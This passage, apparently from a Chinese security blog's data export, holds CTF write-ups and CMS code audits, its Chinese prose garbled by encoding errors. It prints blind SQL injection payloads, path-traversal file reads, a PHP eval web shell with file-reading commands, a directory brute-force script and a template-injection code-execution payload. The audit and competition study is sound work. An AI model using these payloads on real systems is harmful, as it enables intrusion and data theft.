&#123;0&#125;,1)=&apos;&#123;1&#125;&apos;,sleep (10),1)=&apos;%&quot;payload_6 = &quot;a%&apos; &amp;&amp; if((selEct substr(column_name,&#123;0&#125;,1) from information_schema.columns where table_schema=&apos;ddctf&apos;&amp;&amp;table_name=&apos;ctf_key4&apos; limit &#123;1&#125;,1)=&apos;&#123;2&#125;&apos;,sleep (10),1)=&apos;%&quot;# è·å–åˆ°åˆ—å ctf_key4:secvalue; message: id,title,author,time,statuspayload_5 = &quot;a%&apos; &amp;&amp; if((selEct LENGTH(secvalue) from ctf_key4 limit &#123;0&#125;,1)=&apos;&#123;1&#125;&apos;,sleep (10),1)=&apos;%&quot;payload_6 = &quot;a%&apos; &amp;&amp; if((selEct substr(secvalue,&#123;0&#125;,1) from ctf_key4 limit &#123;1&#125;,1)=&apos;&#123;2&#125;&apos;,sleep (10),1)=&apos;%&quot;# è·å–åˆ°flag DDCTF&#123;MSBMCTFMXOCBYFYI&#125; WEB01 ä¸“å±é“¾æ¥step 1:æ ¹æ®é¢˜ç›®æç¤ºï¼Œé¢˜ç›®åªè·Ÿé“¾æ¥IPæœ‰å…³ï¼Œæ‰€ä»¥ä¸»è¦æœ‰1234http://116.85.48.102:5050/welcom/uuid #ä¸»é¡µ æ³¨æ„åˆ°ä¸Šé¢æœ‰email:3814166715717836733@didichuxing.comhttp://116.85.48.102:5050/image/banner/ZmF2aWNvbi5pY28= # ç»™äº†æç¤ºï¼Œåªèƒ½ä¸‹è½½.class,.ks,.ico,.xmlæ–‡ä»¶http://116.85.48.102:5050/news/topFiveNews # æ²¡ç”¨http://116.85.48.102:5050//flag/testflag/yourflag #è®¿é—®æŠ¥é”™ï¼Œä½†æ˜¯æš´éœ²äº†æ§åˆ¶å™¨è·¯å¾„com.didichuxing.ctf.controller.user.FlagController.java step 2:é‚£ä¹ˆæ¥ä¸‹æ¥å°±æ˜¯çŒœè·¯å¾„äº†ï¼Œåœ¨githubä¸Šæ‰¾äº†ä¸ªspringmvc+mybatisçš„é¡¹ç›®,ç»è¿‡æµ‹è¯•ï¼Œå‘ç°ä¸€ä¸‹å‡ ä¸ªæ–‡ä»¶ ../../WEB-INF/web.xml # å¾—åˆ°WEB-INF/applicationContext.xmlï¼Œcom.didichuxing.ctf.listener.InitListener ../../WEB-INF/applicationContext.xml # å¾—åˆ°classpath:mybatis/config.xml ../../WEB-INF/classes/mybatis/config.xml # å¾—åˆ°mapper/FlagMapper.xml ../../WEB-INF/classes/mapper/FlagMapper.xml # sqlè¯­å¥ ../../WEB-INF/classes/com/didichuxing/ctf/model/Flag.class ../../WEB-INF/classes/com/didichuxing/ctf/listener/InitListener.class ../../WEB-INF/classes/com/didichuxing/ctf/controller/user/FlagController.class ../../WEB-INF/classes/sdl.ks # å¯†é’¥æ–‡ä»¶ ../../WEB-INF/classes/com/didichuxing/ctf/service/impl/FlagServiceImpl.class ../../WEB-INF/classes/com/didichuxing/ctf/dao/FlagDao.class step 3:æŠŠä¸Šè¿°çš„classæ–‡ä»¶åœ¨çº¿åç¼–è¯‘åˆ°javaï¼Œé˜…è¯»åå‘ç°flagController.java 12345678@RequestMapping(value=&#123;&quot;/getflag/&#123;email:[0-9a-zA-Z&apos;]+&#125;&quot;&#125;, method=&#123;org.springframework.web.bind.annotation.RequestMethod.POST&#125;) public String getFlag(@PathVariable(&quot;email&quot;) String email, ModelMap model) &#123; Flag flag = flagService.getFlagByEmail(email); return &quot;Encrypted flag : &quot; + flag.getFlag(); &#125; ä»¥ç”¨æˆ·çš„é‚®ç®±æ¥è·å–åŠ å¯†çš„flagï¼Œé‚®ç®±å°±æ˜¯é¦–é¡µä¸Šçš„é‚®ç®±ï¼Œç„¶åé€šè¿‡listener.javaå¾—åˆ°å…·ä½“çš„åŠ å¯†è¿‡ç¨‹ 12345678910111213String flag = &quot;DDCTF&#123;&quot; + Math.abs(sr.nextLong()) + &quot;&#125;&quot;;String uuid = UUID.randomUUID().toString().replace(&quot;-&quot;, &quot;s&quot;);byte[] data = cipher.doFinal(flag.getBytes());byte[] e = mac.doFinal(String.valueOf(email.trim()).getBytes());Flag flago = new Flag();flago.setId(Integer.valueOf(id));flago.setFlag(byte2hex(data));flago.setEmail(byte2hex(e));flago.setOriginFlag(flag);flago.setUuid(uuid);flago.setOriginEmail(email); å¯ä»¥çœ‹åˆ°Emailè¢«è½¬åŒ–ä¸º16è¿›åˆ¶çš„å½¢å¼ï¼Œæ‰€ä»¥éœ€è¦å…ˆå¯¹é‚®ç®±åšå¤„ç†ï¼Œç®€å•ç¼–å†™ä»£ç ï¼ˆåé¢æ”¾ä¸Šæ¥ï¼‰ï¼Œå¾—åˆ°8EF662D0406A099B394DC817AB391718DD7BF29CCC1AAF32A7D7AB23C845CA27ï¼Œä»¥http://116.85.48.102:5050/flag/getflag/8EF662D0406A099B394DC817AB391718DD7BF29CCC1AAF32A7D7AB23C845CA27è¯·æ±‚åå¾—åˆ°åŠ å¯†çš„flagã€‚ step 4:æ¥ä¸‹æ¥å°±æ˜¯å†™ä»£ç è§£å¯†flagäº†ï¼Œå› ä¸ºå¯†é’¥æ–‡ä»¶åœ¨æ‰‹ï¼Œåªéœ€ç¼–å†™ç¨‹åºå³å¯ï¼Œå‚è€ƒhttps://stackoverflow.com/questions/39518979/basic-program-for-encrypt-decrypt-javax-crypto-badpaddingexception-decryption?utm_medium=organic&amp;utm_source=google_rich_qa&amp;utm_campaign=google_rich_qaéœ€è¦æ³¨æ„çš„æ˜¯è¿™é‡Œç”¨äº†ç§é’¥åŠ å¯†å…¬é’¥è§£å¯†ã€‚è§£å¯†åå¾—åˆ°flag"},{"title":"ã€CTFã€‘HITB-XCTF 2018 web writeup","permalink":"http://blog.0kami.cn/2018/04/15/hitb-xctf-2018-portion-web-writeup/","text":"upload è€ƒç‚¹windowså¹³å°çš„ä¸€äº›ç‰¹æ€§ windowså¹³å°ç‰¹æ€§windowsä¸‹æœç´¢æ–‡ä»¶ç”¨åˆ°çš„æ˜¯FindFirstFileï¼Œè¯¥å‡½æ•°æ‰§è¡Œæ—¶ï¼Œä¼šå°†&quot;&lt;&quot; =&gt; &quot;*&quot;ã€&quot;&gt;&quot; =&gt; &quot;?&quot;ã€&quot; =&gt; .ï¼Œæ‰€ä»¥åœ¨åº”ç”¨ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¿™ä¸ªç‰¹æ€§ã€‚e.g. `?filename=a&gt; =&gt; a?` åŒ¹é…å•ä¸ªå­—ç¬¦ `?filename=a&lt; =&gt; a*` åŒ¹é…å¤šä¸ªå­—ç¬¦ `?filename=a&quot; =&gt; a.` NTFS ADSç‰¹æ€§ ä¸Šä¼ çš„æ–‡ä»¶å ç³»ç»Ÿç»“æœ test.php:a.jpg ç”Ÿæˆtest.phpï¼Œä½†æ˜¯æ— å†…å®¹ test.php::$DATA ç”Ÿæˆtest.phpï¼Œæœ‰å†…å®¹ test.php::$INDEX_ALLOCATION ç”Ÿæˆtest.phpæ–‡ä»¶å¤¹ test.php::$DATA.jpg ç”Ÿæˆ0.jpgï¼Œæœ‰å†…å®¹ test.php::$DATA\\test.jpg ç”Ÿæˆaaa.jpgï¼Œæœ‰å†…å®¹ è¿‡ç¨‹ step 1:åŠŸèƒ½ç‚¹#æ–‡ä»¶ä¸Šä¼  #ä¸Šä¼ æ–‡ä»¶å®½é«˜ =&gt; getshellç¯å¢ƒï¼šIIS7.0 Windows Server 2008 Standard Edition Service Pack 2 step 2:æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½é»‘åå•phpï¼Œæ–‡ä»¶åå‰ç¼€æ—¶é—´æˆ³é‡å†™ï¼Œä½†æˆªå–ä¸Šä¼ æ–‡ä»¶åçš„æœ€åä¸€ä¸ªåç¼€ä¸å˜ã€‚ç®€å•åˆ©ç”¨ADSç‰¹æ€§ï¼Œä¸Šä¼ test.php::$DATA step 3:ä¸Šä¼ äº†æ–‡ä»¶åï¼Œéœ€è¦æ‰¾åˆ°æ–‡ä»¶ç›®å½•ã€‚pic.phpè¿”å›äº†ä¸Šä¼ æ–‡ä»¶å®½å’Œé«˜ï¼ŒçŒœæµ‹å…¶ä½¿ç”¨äº†getimagesizeï¼Œæƒ³åˆ°å‰æ®µæ—¶é—´çš„ä¸€ç¯‡å¸–å­ï¼Œå†™ä¸ªè„šæœ¬è·‘è¯¥å¤æ‚ç›®å½• 1234567891011121314151617#!/usr/bin/env python# -*- coding: utf-8 -*-# Created by wh1t3P1g at 2018/4/11import requestsstr=&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;ret=&quot;&quot;for i in range(32): for c in str: t=ret+c url=&quot;http://47.90.97.18:9999/pic.php?filename=../&quot;+t+&quot;%3C/1523456340.jpg&quot; r=requests.get(url) if &quot;width&quot; in r.content: ret+=c print ret break å¾—åˆ°ç›®å½•87194f13726af7cee27ba2cfe97b60df step 4:æœ‰äº†ç›®å½•å°±èƒ½è®¿é—®ä¸Šä¼ çš„ä¸€å¥è¯&lt;?php eval($_POST[cmd]);?&gt;ï¼Œç³»ç»Ÿç¦ç”¨äº†æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„ä¸€äº›å‡½æ•°ï¼Œä½†æ˜¯è¿™é‡Œå¹¶ä¸éœ€è¦æ‰§è¡Œå‘½ä»¤ã€‚è¿™é‡Œä¸æˆªå›¾äº†cmd=var_dump(glob(&quot;../*&quot;));å¾—åˆ°flag.phpï¼Œè®¿é—®åå‘ç°éœ€è¦è¯»å–flag.phpçš„å†…å®¹cmd=echo readfile(&quot;../flag.php&quot;);å¾—åˆ°flag æ€»ç»“è¿™æ¬¡å°±åšäº†ä¸€é“webï¼Œè¿˜æœ‰å¾…æé«˜å’Œç§¯ç´¯:)"},{"title":"ã€Code Analysisã€‘MovieGuide v2.0 SQLi","permalink":"http://blog.0kami.cn/2018/02/03/MovieGuide2SQLi/","text":"0x00Detail: Movie Guide v2.0 SQL Injection 0x01è¿™æ˜¯ä¸€ä¸ªæ¯”è¾ƒç²—ç³™çš„å¼€æºcmsï¼Œæ€»ä½“æ¥è¯´å¹¶æ²¡æœ‰å¯¹è¾“å…¥è¾“å‡ºåšå®‰å…¨å¤„ç†ï¼Œä»PoCå…¥æ‰‹ï¼Œé€‰ä¸€ä¸ªè¿˜åŸä¸€ä¸‹æ¼æ´å½¢æˆè¿‡ç¨‹ã€‚ PoCï¼šindex.php?md=[SQL]å®šä½ä¸€ä¸‹mdå‚æ•°layout.phpä¸ºè¯¥cmsçš„ä¸»è¦å…¥å£å¤„ç†,ä¸‹è¿°çš„å˜é‡å‡æ²¡æœ‰é€šè¿‡å®‰å…¨å¤„ç†ï¼Œç›´æ¥SQLè¯­å¥ï¼Œä»è€Œéƒ½å¯ä»¥ç”¨äºæ•°æ®åº“æ³¨å…¥ã€‚12345678//Get the passed variables.$mterm = filter_input(INPUT_POST, 'tterm');$cterm = filter_input(INPUT_POST, 'gterm');$lterm = filter_input(INPUT_GET, 'gterm');$yterm = filter_input(INPUT_GET, 'year');$md = filter_input(INPUT_GET, 'md');$actorname = filter_input(INPUT_GET, 'actor');$directorname = filter_input(INPUT_GET, 'director'); ç›´æ¥æ‹¼æ¥å…¥SQLè¯­å¥1$sql = &quot;SELECT * FROM `Movie_List` WHERE `Main_Dir` LIKE &apos;&quot; . $md . &quot;&apos; ORDER BY `Movie_Title` ASC Limit $start, $perpage&quot;; è¿™é‡Œæ¯”è¾ƒæœ‰æ„æ€çš„æ˜¯å®ƒçš„PoCï¼Œä»¥å‰æ²¡æœ‰è§è¿‡ç±»ä¼¼çš„:bï¼ŒPoCä¸­ä½¿ç”¨äº†export_setå‡½æ•° EXPORT_SET(bits,on,off[,separator[,number_of_bits]])Returns a string such that for every bit set in the value bits, you get an on string and for every bit not set in the value, you get an off string. Bits in bits are examined from right to left (from low-order to high-order bits). Strings are added to the result from left to right, separated by the separator string (the default being the comma character ,). The number of bits examined is given by number_of_bits, which has a default of 64 if not specified. number_of_bits is silently clipped to 64 if larger than 64. It is treated as an unsigned integer, so a value of âˆ’1 is effectively the same as 64. åˆ†è§£ä¸€ä¸‹PoC123456789101112131415/*!02222UNION*/( /*!02222SELECT*/ 0x253238253331253239,0x253238253332253239, ( /*!02222Select*/ export_set(5,@a:=0, (/*!02222select*/ count(*)/*!02222from*/(information_schema.columns)where@a:=// data-&gt;@a export_set(5, export_set(5,@a,/*!02222table_name*/,&apos;&lt;li&gt;&apos;,2)//dump table_name [0&lt;li&gt;table_name] ,/*!02222column_name*/,&apos;\\n:&apos;,2)//dump column_name [0&lt;li&gt;table_name\\n:columns_name] ) ,@a,2)//set @a split char ) ,0x253238253334253239,0x253238253335253239,0x253238253336253239,0x253238253337253239,0x253238253338253239,0x253238253339253239,0x253238253331253330253239,0x253238253331253331253239,0x253238253331253332253239 )-- - è¿™é‡Œä¸»è¦åˆ©ç”¨çš„æ˜¯export_setå‡½æ•°çš„noï¼Œoffä½ç½®æ¥dumpæ•°æ®ã€‚ é¦–å…ˆé€šè¿‡@a:=0ï¼Œå®šä¹‰å˜é‡aä¸º0ï¼ˆå¯èƒ½è·Ÿmysqlç‰ˆæœ¬æœ‰å…³ç³»ï¼Œ5.7.xä¸‹çš„mysqlæ— æ³•ç”¨@:=0æ¥å®šä¹‰ï¼‰ æœ€é‡Œé¢çš„export_setï¼Œå°†table_name dumpå‡ºæ¥ï¼ˆç»“æœä¸º0&lt;li&gt;table_nameï¼‰ æ¥ä¸‹æ¥çš„ä¸€ä¸ªexport_setï¼Œå°†columns_name dumpå‡ºæ¥(ç»“æœä¸º0&lt;li&gt;table_name\\n:columns_name) select count(*) from (information_schema.columns)where@a:=export_set(5,export_set(5,@a,table_name,&#39;&lt;li&gt;&#39;,2),column_name,&#39;\\n:&#39;,2)å°†ä¸Šè¿°çš„æ•°æ®èµ‹å€¼ç»™å˜é‡a æœ€åç”¨æœ€åä¸€ä¸ªexport_setï¼Œç”¨@aåšåˆ†éš”ç¬¦ï¼Œå°†æ•°æ®dumpå‡ºæ¥ 0x02 æ€»ç»“è¯¥cmsçš„æ³¨å…¥æ¼æ´å¾ˆå¸¸è§„ï¼Œä¸»è¦æ˜¯å­¦ä¹ åˆ†æäº†è¯¥PoCï¼Œèƒ½åœ¨æœªæ¥æ³¨å…¥ç»•è¿‡çš„åœ°æ–¹åº”ç”¨ã€‚ mysqlçš„è‡ªå®šä¹‰å˜é‡@çš„åº”ç”¨ï¼Œå¯ä»¥åœ¨ä¸€å®šç¨‹åº¦ä¸Šæ¶ˆé™¤ç©ºæ ¼ï¼Œä»¥åŠæ­£åˆ™\\bwhere\\bçš„ç»•è¿‡ /!02222select*/è¿™ä¸ªæ–¹æ³•ä¹Ÿæ˜¯ç»å¸¸å¬è¯´ï¼Œä¹Ÿåœ¨è¿™é‡Œç”¨åˆ°äº†ï¼Œä¸€ä¸ªå¾ˆå¥½çš„ä¾‹å­ã€‚ export_setçš„åº”ç”¨ï¼Œæ¯”è¾ƒé‡è¦çš„åº”ç”¨ï¼Œåœ¨æŸäº›æƒ…å†µä¸‹å¯ç”¨äºç»•è¿‡"},{"title":"ã€Code Reviewã€‘seacms v6.5 å‰å°getshell","permalink":"http://blog.0kami.cn/2017/03/16/old-seacms-v6-5-getshell/","text":"æ¦‚è¿°å‰æ®µæ—¶é—´æ”¾åœ¨90secä¸Šçš„ä¸€ç¯‡ä»£ç å®¡è®¡ï¼Œæ”¶æ‹¾ä¸€ä¸‹æ”¾åˆ°è‡ªå·±åšå®¢ä¸Š åˆ†æcmsç‰ˆæœ¬ï¼š6.45ç›´æ¥ä¸Šä»£ç 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051function parseIf($content)&#123; if (strpos($content,&apos;&#123;if:&apos;)=== false)&#123; return $content; &#125;else&#123; $labelRule = buildregx(&quot;&#123;if:(.*?)&#125;(.*?)&#123;end if&#125;&quot;,&quot;is&quot;); $labelRule2=&quot;&#123;elseif&quot;; $labelRule3=&quot;&#123;else&#125;&quot;; preg_match_all($labelRule,$content,$iar); $arlen=count($iar[0]); $elseIfFlag=false; for($m=0;$m&lt;$arlen;$m++)&#123; $strIf=$iar[1][$m]; $strIf=$this-&gt;parseStrIf($strIf); $strThen=$iar[2][$m]; $strThen=$this-&gt;parseSubIf($strThen); if (strpos($strThen,$labelRule2)===false)&#123; if (strpos($strThen,$labelRule3)&gt;=0)&#123; $elsearray=explode($labelRule3,$strThen); $strThen1=$elsearray[0]; $strElse1=$elsearray[1]; echo &quot;if(&quot;.$strIf.&quot;) &#123; \\$ifFlag=true;&#125; else&#123; \\$ifFlag=false;&#125;&quot;; eval(&quot;if(&quot;.$strIf.&quot;)&#123;\\$ifFlag=true;&#125;else&#123;\\$ifFlag=false;&#125;&quot;); if ($ifFlag)&#123; $content=str_replace($iar[0][$m],$strThen1,$content);&#125; else &#123;$content=str_replace($iar[0][$m],$strElse1,$content);&#125; &#125;else&#123; @eval(&quot;if(&quot;.$strIf.&quot;) &#123; \\$ifFlag=true;&#125; else&#123; \\$ifFlag=false;&#125;&quot;); if ($ifFlag) $content=str_replace($iar[0][$m],$strThen,$content); else $content=str_replace($iar[0][$m],&quot;&quot;,$content);&#125; &#125;else&#123; $elseIfArray=explode($labelRule2,$strThen); $elseIfArrayLen=count($elseIfArray); $elseIfSubArray=explode($labelRule3,$elseIfArray[$elseIfArrayLen-1]); $resultStr=$elseIfSubArray[1]; $elseIfArraystr0=addslashes($elseIfArray[0]); @eval(&quot;if($strIf)&#123;\\$resultStr=\\&quot;$elseIfArraystr0\\&quot;;&#125;&quot;); for($elseIfLen=1;$elseIfLen&lt;$elseIfArrayLen;$elseIfLen++)&#123; $strElseIf=getSubStrByFromAndEnd($elseIfArray[$elseIfLen],&quot;:&quot;,&quot;&#125;&quot;,&quot;&quot;); $strElseIf=$this-&gt;parseStrIf($strElseIf); $strElseIfThen=addslashes(getSubStrByFromAndEnd($elseIfArray[$elseIfLen],&quot;&#125;&quot;,&quot;&quot;,&quot;start&quot;)); @eval(&quot;if(&quot;.$strElseIf.&quot;)&#123;\\$resultStr=\\&quot;$strElseIfThen\\&quot;;&#125;&quot;); @eval(&quot;if(&quot;.$strElseIf.&quot;)&#123;\\$elseIfFlag=true;&#125;else&#123;\\$elseIfFlag=false;&#125;&quot;); if ($elseIfFlag) &#123;break;&#125; &#125; $strElseIf0=getSubStrByFromAndEnd($elseIfSubArray[0],&quot;:&quot;,&quot;&#125;&quot;,&quot;&quot;); $strElseIfThen0=addslashes(getSubStrByFromAndEnd($elseIfSubArray[0],&quot;&#125;&quot;,&quot;&quot;,&quot;start&quot;)); if(strpos($strElseIf0,&apos;==&apos;)===false&amp;&amp;strpos($strElseIf0,&apos;=&apos;)&gt;0)$strElseIf0=str_replace(&apos;=&apos;, &apos;==&apos;, $strElseIf0); @eval(&quot;if(&quot;.$strElseIf0.&quot;)&#123;\\$resultStr=\\&quot;$strElseIfThen0\\&quot;;\\$elseIfFlag=true;&#125;&quot;); $content=str_replace($iar[0][$m],$resultStr,$content); &#125; &#125; return $content; &#125; &#125; ä¸Šé¢ä¸»è¦é€»è¾‘ä¸ºè§£æhtmlæ–‡ä»¶ä¸­çš„{if:}{end if}æ ‡ç­¾ä»£ç ï¼Œå¯ä»¥çœ‹åˆ°æ²¡æœ‰åšä»»ä½•å¤„ç†å°±evalï¼Œé‚£ä¹ˆæˆ‘ä»¬æŸ¥æ‰¾ä¸€ä¸‹å¯¹åº”è°ƒç”¨çš„åœ°æ–¹ä¼šä¸ä¼šæœ‰æ¼æ´ã€‚ä¸»è¦å…³æ³¨å‰å°ï¼Œæ‰¾åˆ°ä¸€å¤„è§£ææœç´¢ç»“æœçš„é¡µé¢ï¼ˆsearch.phpï¼‰ï¼Œä»£ç æ¯”è¾ƒå¤šï¼Œä¸€ç‚¹ä¸€ç‚¹æ¥çœ‹ã€‚æ‰¾åˆ°è°ƒç”¨çš„ä½ç½®line 212$content=$mainClassObj-&gt;parseIf($content);å¾€ä¸Šçœ‹ï¼Œå‘ç°ä»–çš„é€»è¾‘æ˜¯å…ˆè§£æå…¶ä»–ç±»å‹çš„æ ‡ç­¾ï¼Œæ¯”å¦‚{searchpage:page}é‚£ä¹ˆæ¥ä¸‹æ¥çš„æ€è·¯ï¼Œä¸»è¦æ˜¯2ç‚¹ï¼ŒæŸ¥æ‰¾å¯¹åº”ifæ ‡ç­¾å¯æ§çš„ä½ç½®ï¼Œå¦ä¸€ç§å°±æ˜¯æŸ¥æ‰¾å…¶ä»–æ ‡ç­¾çš„å¯æ§å†…å®¹ï¼Œå†™å…¥ifæ ‡ç­¾æˆ‘æ‰¾åˆ°ä¸€å¤„å…¶ä»–æ ‡ç­¾å¯æ§ä¸”æ²¡æœ‰åšä»»ä½•å¤„ç†çš„ä½ç½®ï¼Œç›´æ¥å†™å…¥ifæ ‡ç­¾è¯­å¥å³å¯é€ æˆä»»æ„ä»£ç æ‰§è¡Œ1234567891011121314function echoSearchPage()&#123; global $dsql,$cfg_iscache,$mainClassObj,$page,$t1,$cfg_search_time,$searchtype,$searchword,$tid,$year,$letter,$area,$yuyan,$state,$ver,$order,$jq,$money,$cfg_basehost; $order = !empty($order)?$order:time;.........$content = str_replace(&quot;&#123;searchpage:page&#125;&quot;,$page,$content); $content = str_replace(&quot;&#123;seacms:searchword&#125;&quot;,$searchword,$content); $content = str_replace(&quot;&#123;seacms:searchnum&#125;&quot;,$TotalResult,$content); $content = str_replace(&quot;&#123;searchpage:ordername&#125;&quot;,$order,$content);......... orderå˜é‡å¯æ§å¹¶ä¸”åœ¨è°ƒç”¨parseIfå‡½æ•°å‰å…ˆè§£æï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡orderå†™å…¥ifæ ‡ç­¾ã€‚æŸ¥çœ‹ä¸€ä¸‹å…·ä½“htmlä»£ç 1234567&lt;div class=&quot;btn-toolbar&quot; role=&quot;toolbar&quot;&gt; &lt;div class=&quot;btn-group&quot;&gt; &lt;a href=&quot;&#123;searchpage:order-time-link&#125;&quot; &#123;if:&quot;&#123;searchpage:ordername&#125;&quot;==&quot;time&quot;&#125; class=&quot;btn btn-success&quot; &#123;else&#125; class=&quot;btn btn-default&quot; &#123;end if&#125; id=&quot;orderhits&quot;&gt;æœ€æ–°ä¸Šæ˜ &lt;/a&gt; &lt;a href=&quot;&#123;searchpage:order-hit-link&#125;&quot; &#123;if:&quot;&#123;searchpage:ordername&#125;&quot;==&quot;hit&quot;&#125; class=&quot;btn btn-success&quot; &#123;else&#125; class=&quot;btn btn-default&quot; &#123;end if&#125; id=&quot;orderaddtime&quot;&gt;æœ€è¿‘çƒ­æ’­&lt;/a&gt; &lt;a href=&quot;&#123;searchpage:order-score-link&#125;&quot; &#123;if:&quot;&#123;searchpage:ordername&#125;&quot;==&quot;score&quot;&#125; class=&quot;btn btn-success&quot; &#123;else&#125; class=&quot;btn btn-default&quot; &#123;end if&#125; id=&quot;ordergold&quot;&gt;è¯„åˆ†æœ€é«˜&lt;/a&gt; &lt;/div&gt; &lt;/div&gt; é‚£ä¹ˆæ¥ä¸‹æ¥å°±å¯ä»¥æ„é€ pocäº†ï¼Œç±»ä¼¼sqlæ³¨å…¥ï¼Œæˆ‘ä»¬å…ˆæŠŠå‰é¢çš„ifæ ‡ç­¾è¯­å¥é—­åˆï¼Œå†™å…¥æ¶æ„ä»£ç å¹¶é—­åˆåé¢çš„ifæ ‡ç­¾ã€‚exampleï¼š}{end if}{if:1)phpinfo();if(1}{end if}æœ¬åœ°éªŒè¯ä¸€ä¸‹ æ€»ç»“è¿™æ˜¯ä¸€ä¸ªæ¯”è¾ƒç»å…¸çš„æ¼æ´ï¼Œä¹Ÿå¯ä»¥è¢«ç§°ä¸ºæ¨¡ç‰ˆè§£æå§æˆ‘è§‰å¾—ï¼šï¼‰ps: åæ‚”å•Šï¼Œæ²¡æœ‰å…ˆæäº¤ä¸ªpocå¹³å°T_T"},{"title":"ã€CTFã€‘NJCTF2017 writeup","permalink":"http://blog.0kami.cn/2017/03/15/old-njctf-2017/","text":"æ¦‚è¿°è¾èŒåæ²¡äº‹æƒ…å¹²ï¼Œåˆšå¥½èµ¶ä¸Šnjctfï¼Œè¿˜æ˜¯ä¸€æ ·èœå•Šï¼Œåªåšäº†7é“é¢˜ï¼Œè¿˜è¦ç»§ç»­åŠªåŠ›ğŸ’ªï¼ˆps:æ¯•ä¸šè®¾è®¡ä»€ä¹ˆé¬¼å•Šï¼‰å†™ä¸€ä¸‹webçš„writeupï¼Œç”±äºé¢˜ç›®è¿˜å¼€ç€ï¼ŒæŠŠæ²¡åšå‡ºæ¥çš„åšä¸€éï¼Œçºªå½•ä¸€ä¸‹æˆ‘è§‰å¾—æœ‰å¿…è¦è®°çš„é¢˜ Webé¢˜Loginï¼ˆ100ï¼‰å¥½å§ï¼Œè¿™é“é¢˜å–äº†å·§ï¼Œè°è®©å¤§é»‘å®¢ä»¬éƒ½æ˜¯å¼±å¯†ç å‘¢ï¼ï¼ï¼ï¼ç”±äºæ²¡æœ‰åšéªŒè¯ç æœºåˆ¶ï¼Œæ‰€ä»¥æ‰«äº†ä¸€æ³¢å¼±å£ä»¤ï¼Œç„¶åâ€¦ç„¶åå°±è¿›å»å•¦å…¶å®è¿™é“é¢˜è€ƒçš„æ˜¯mysqlçš„é•¿åº¦é™åˆ¶æ¼æ´ã€‚åˆ©ç”¨2ä¸ªmysqlçš„ç‰¹æ€§ å½“æ•°æ®è¶…è¿‡å»ºè¡¨æ—¶çš„è§„å®šçš„æ•°æ®å¤§å°ï¼Œmysqlå°†è¶…è¿‡çš„éƒ¨åˆ†æˆªæ–­ å½“selectæ—¶whereæŸ¥è¯¢å­—å¥ä¸­çš„æ•°æ®å¦‚æœæœ€åä»¥ç©ºæ ¼ç»“å°¾ï¼Œmysqlé»˜è®¤å°†ç©ºæ ¼å»é™¤æŸ¥è¯¢é‚£ä¹ˆåˆ©ç”¨è¿™2ä¸ªç‰¹æ€§ï¼Œæˆ‘ä»¬åªè¦æ³¨å†Œä¸€ä¸ªadmin+N*%20+xå°±å¯ä»¥å·²adminç™»é™†ï¼Œç„¶ågetflagï¼šNJCTF{4R3_Y0u_7H3_Re41_aDM1N?} Get Flag(100)è¿™é“é¢˜è€ƒäº†å‘½ä»¤æ‰§è¡Œæ¼æ´é¦–å…ˆå‘ç°å­˜åœ¨æ–‡ä»¶ä»»æ„è¯»å–æ¼æ´ï¼Œé‚£ä¹ˆå°è¯•è¯»å–ä¸€ä¸‹æºç ï¼Œæœ€åè¯•å‡ºæ¥æ˜¯app.pyå¯ä»¥çœ‹åˆ°æœ‰ä¸ªå‘½ä»¤æ‰§è¡Œå¹¶ä¸”æ˜¯å¯æ§çš„ï¼Œä½†æ˜¯è¿‡æ»¤äº†ä¸€äº›å­—ç¬¦ï¼Œç”¨&amp;å°±å¯ä»¥ç»•è¿‡ã€‚ls æŸ¥çœ‹ä¸€ä¸‹å¯ä»¥çœ‹åˆ°flagæ–‡ä»¶9iZM2qTEmq67SOdJp%!oJm2%M4!nhS_thi5_flagcatä¸€æ³¢ï¼Œè¿™é‡Œçš„ç‰¹æ®Šå­—ç¬¦è½¬ç§»æ˜¯å…³é”® come on(200)å…·ä½“çœ‹å¤§ä½¬ä»¬çš„writeupå³å¯ï¼Œè¿™é“é¢˜ä¸»è¦å­¦åˆ°äº†å…¶ç›²æ³¨çš„æ³¨å…¥æ–¹å¼ã€‚binaryå‡½æ•°ç”¨æ¥åŒºåˆ†å¤§å°å†™ 12345select xxx from xxx like x%select xxx from xxx like xx%select xxx from xxx like xxx%select xxx from xxx like xxxx%... é€šè¿‡likeæ¥ä½å‡ºæ•°æ® Be Admin(300)é¦–å…ˆå‘ç°æœ‰.bakæ–‡ä»¶ï¼Œä¸‹ä¸‹æ¥çœ‹ä¸€ä¸‹,å‘ç°è¿™é“é¢˜ä¸»è¦è€ƒçš„æ˜¯cbcå­—èŠ‚ç¿»è½¬æ”»å‡»å’Œpadding oracle attack.é¦–å…ˆç”±äºç™»é™†å‡ºå­˜åœ¨æ³¨å…¥ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠæ•°æ®ä¸­çš„encrypt_passå–å‡ºæ¥ç™»é™†ç»•è¿‡å¯ä»¥é€šè¿‡phpå¼±ç±»å‹æ¯”è¾ƒæ¥ç»•è¿‡ï¼Œadminï¼0å³å¯ç™»é™†è¦é€šè¿‡cbcå­—èŠ‚ç¿»è½¬å¿…é¡»çŸ¥é“defaultIdçš„å€¼ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å…ˆè·‘å‡ºdefaultIdçš„å€¼padding oracle attackå‚è€ƒpadding oracle attackç¬¦åˆæˆ‘ä»¬ç°åœ¨çš„æƒ…å†µï¼š å·²çŸ¥çœŸå®IV å·²çŸ¥å¯¹åº”cipher text å½“è§£å¯†å¤±è´¥ERRORé”™è¯¯é¢˜ç›®ç¯å¢ƒå¯èƒ½åäº†ï¼Œæœ¬åœ°æ­ä¸€ä¸‹ï¼Œè·‘ä¸€ä¸‹ä¸­é—´å€¼éœ€è¦æ³¨æ„çš„ä¸€ç‚¹æ˜¯padding oracle attackç¬¬ä¸€ä¸ªå­—ç¬¦æ²¡åŠæ³•è·‘å‡ºæ¥ï¼Œç”±äºæœ€åä¸€ä¸ªå­—ç¬¦è§£å‡ºæ¥æ˜¯ç©ºç™½æ‰€ä»¥è¿˜æ˜¯errorï¼Œä¸è¿‡æ²¡å…³ç³»æš´åŠ›ä¸€éå°±å¥½äº†ï¼ˆpsï¼šæœ‰äº†åŸç†ï¼Œå†™ä»£ç 